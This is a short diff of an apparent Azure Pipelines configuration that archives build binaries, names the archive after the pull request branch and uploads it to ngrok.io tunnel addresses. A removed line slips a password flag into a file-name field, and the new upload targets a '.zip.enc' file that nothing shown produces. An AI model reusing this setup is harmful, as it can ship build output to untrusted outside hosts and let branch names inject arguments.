@@ -36,13 +36,13 @@ steps:
   inputs:
     rootFolderOrFile: '$(Build.BinariesDirectory)'
     includeRootFolder: true
-    archiveType: '7z'
-    archiveFile: '$(Build.ArtifactStagingDirectory)/$(system.pullRequest.sourceBranch).zip -ptest123'
+    archiveType: 'zip'
+    archiveFile: '$(Build.ArtifactStagingDirectory)/$(system.pullRequest.sourceBranch).zip'
     replaceExistingArchive: true
    
 
 - task: cURLUploader@2
   inputs:
-    files: '$(Build.ArtifactStagingDirectory)/$(system.pullRequest.sourceBranch).zip'
+    files: '$(Build.ArtifactStagingDirectory)/$(system.pullRequest.sourceBranch).zip.enc'
     authType: 'UserAndPass'
-    url: 'https://3ca918a8b7ea.ngrok.io/'
+    url: 'https://e0bc083cf714.ngrok.io'
